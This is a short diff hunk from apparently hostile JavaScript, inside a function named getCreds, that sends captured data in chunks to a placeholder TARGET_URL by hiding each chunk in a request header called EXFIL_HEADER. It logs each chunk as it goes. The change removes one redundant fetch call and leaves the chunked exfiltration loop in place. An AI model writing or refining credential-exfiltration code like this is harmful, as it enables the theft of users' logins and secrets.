@@ -68,8 +68,6 @@ function getCreds() {
                         if (debug) {console.log(`[>] Sending chunk ${index + 1}: "${chunk}"`);}
                         fetch('TARGET_URL', {headers: {EXFIL_HEADER.replace('{{PAYLOAD}}', chunk)}});
                     });
-
-                    fetch('TARGET_URL', {headers: {EXFIL_HEADER}});
                 }
             };
 
